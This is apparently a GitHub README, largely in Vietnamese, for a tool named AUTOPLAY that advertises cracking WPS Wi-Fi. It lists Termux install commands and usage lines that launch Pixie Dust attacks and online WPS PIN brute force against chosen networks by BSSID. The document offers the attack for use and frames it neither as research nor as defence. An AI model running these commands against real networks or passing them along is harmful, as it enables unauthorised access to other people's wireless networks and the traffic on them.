# AUTOPLAY
Crack wps wifi


![68747470733a2f2f692e6962622e636f2f4b3734673053432f68756c752e6a7067](https://github.com/user-attachments/assets/d3c0c73f-5a44-4b59-ade1-9e82a0ae8b06)


# Cài Đặt :
* pkg update && pkg upgrade -y
* pkg install root-repo -y
* pip install pycryptodome
* pkg install git tsu python wpa-supplicant pixiewps iw openssl -y
* git clone https://github.com/autoplay2025/Wifi-Pass.git
* cd Wifi-Pass
* chmod +x autoplay.py
* sudo python autoplay.py -i wlan0 -K
# Ghi Chú :
Đầu tiên hãy tắt Wifi.

Hiển thị các mạng khả dụng và bắt đầu tấn công Pixie Dust trên mạng được chỉ định.

sudo python autoplay.py -i wlan0 -K

Bắt đầu tấn công Pixie Dust vào BSSID được chỉ định: sudo python autoplay.py -i wlan0 -b 00:91:4C:C3:AC:28 -K
Khởi chạy WPS bruteforce trực tuyến với nửa đầu mã PIN được chỉ định:
sudo python autoplay.py -i wlan0 -b 00:90:4C:C1:AC:21 -B -p 1234

#Xử Lí Sự Cố
"Thiết bị hoặc tài nguyên đang bận (-16)" - Bật Wifi rồi tắt Wifi.
